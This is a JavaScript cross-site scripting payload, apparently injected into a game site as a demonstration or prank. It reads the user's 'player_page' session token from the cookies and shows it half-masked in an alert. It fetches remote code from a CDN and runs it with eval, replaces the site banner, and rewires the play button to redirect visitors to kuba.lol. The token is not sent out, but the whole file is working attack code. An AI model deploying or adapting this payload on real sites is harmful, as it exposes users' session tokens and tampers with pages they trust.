;(async()=>{

	const utils = {
		get cookies() {
			return document.cookie.split("; ").map(v=>v.split("=")).reduce((a,[k,v])=>({...a, [k]:decodeURI(v)}),{})
		},
		avatar: "//avatars.githubusercontent.com/u/47297843",
		page: "//kuba.lol"
	}

	const token = utils.cookies.player_page
	const censoredToken = token.slice(0,token.length/2) + "*".repeat(token.length/2)

	alert([
		`Your token: ${censoredToken}`,
		"Be aware of scammers",
		"",
		"(also i'm sorry for breaking some places on site, couldn't fit the script more tight-)",
		"",
		"Learn more about this attack at https://wikipedia.org/wiki/Cross-Site-Scripting"
	].join("\n"))

	await fetch("https://cdn.jsdelivr.net/npm/@alec.brunelle/darkmode-js@1.5.0/lib/darkmode-js.min.js")
		.then(r => r.text())
		.then(async t => {
			if(!window.Darkmode) eval(t)
			while(typeof window.Darkmode === "undefined") await new Promise(r => setTimeout(r, 1e3))	

			new Darkmode({
				mixColor: '#fff',
				backgroundColor: '#fff',
				buttonColorDark: '#100f2c',
				buttonColorLight: '#fff',
				saveInCookies: false,
				time: "0s"
			}).toggle()

		})

	const bannerImg = (document.getElementById("header") || document.createElement("div")).querySelector("img")
	if(bannerImg) {
			;[
				["src", utils.avatar],
				["height", "200"]
			].forEach(([k,v])=>bannerImg[k] = v)
	}

const playButton = document.querySelector(`.menu_button[onclick*="tmtp://"]`)
if(playButton) {
	const [icon, text] = playButton.querySelectorAll("td")

	playButton.onclick = undefined;
	playButton.addEventListener("click", () => location.href = utils.page)
	icon.querySelector("img").src = utils.avatar
	text.innerText = "Visit kuba.lol"
}


})();
